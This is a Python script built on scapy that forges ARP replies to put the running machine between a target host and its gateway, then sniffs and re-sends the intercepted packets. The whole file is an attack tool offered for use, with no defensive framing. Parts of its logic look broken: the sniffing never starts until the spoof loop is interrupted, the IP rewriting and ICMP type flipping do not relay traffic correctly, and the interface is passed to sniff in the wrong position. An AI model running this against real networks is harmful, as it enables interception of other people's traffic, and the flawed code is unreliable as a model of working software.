import sys
import time
from scapy.layers.l2 import getmacbyip, ARP
from scapy.sendrecv import send, sniff
from scapy.layers.inet import IP, ICMP


# Define the ARP spoofing function to send fake ARP packets to the target and gateway
def arp_spoof(target_ip, gateway_ip):
    # Get the MAC addresses of the target and gateway
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    # Craft ARP packets with the appropriate source and destination IP and MAC addresses
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    # Send the ARP packets to the network
    send(target_packet, verbose=False)
    send(gateway_packet, verbose=False)


# Define the packet forwarding function to forward packets between the target and gateway through our own computer
def forward_packets(packet, target_ip, gateway_ip, our_ip):
    # Check if the packet is an IP packet
    if packet.haslayer(IP):
        # If the packet was sent by the target to the gateway, forward it through our own computer
        if packet[IP].src == target_ip and packet[IP].dst == gateway_ip:
            # Change the packet's source IP address to our own IP address
            packet[IP].src = our_ip

            # If the packet is an ICMP packet, modify the type to echo reply
            if packet.haslayer(ICMP):
                packet[ICMP].type = 0

            # Send the packet to the gateway
            send(packet)

        # If the packet was sent by the gateway to the target, forward it through our own computer
        elif packet[IP].src == gateway_ip and packet[IP].dst == target_ip:
            # Change the packet's destination IP address to our own IP address
            packet[IP].dst = our_ip

            # If the packet is an ICMP packet, modify the type to echo request
            if packet.haslayer(ICMP):
                packet[ICMP].type = 8

            # Send the packet to the target
            send(packet)


if __name__ == "__main__":
    # Check that the script is being used correctly with three arguments (target IP, gateway IP, and our own IP)
    if len(sys.argv) != 4:
        print("Usage: " + sys.argv[0] + " <target_ip> <gateway_ip> <our_ip>")
        sys.exit(1)
    # Get the target IP and gateway IP from the command-line arguments
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    our_ip = sys.argv[3]

    # Set the network interface to use for ARP spoofing and packet sniffing
    iface = "eth0"

    # Start ARP spoofing by sending fake ARP packets to the target and gateway
    print("[+] Starting ARP spoofing...")
    while True:
        try:
            arp_spoof(target_ip, gateway_ip)
            time.sleep(2)  # Pause for 2 seconds between sending ARP packets
        except KeyboardInterrupt:
            print("\n[+] Stopping ARP spoofing...")
            break

    # Start packet sniffing on the network interface to capture packets between the target and gateway
    print("[+] Starting packet sniffing...")
    sniff(
        iface, prn=lambda packet: forward_packets(packet, target_ip, gateway_ip, our_ip)
    )
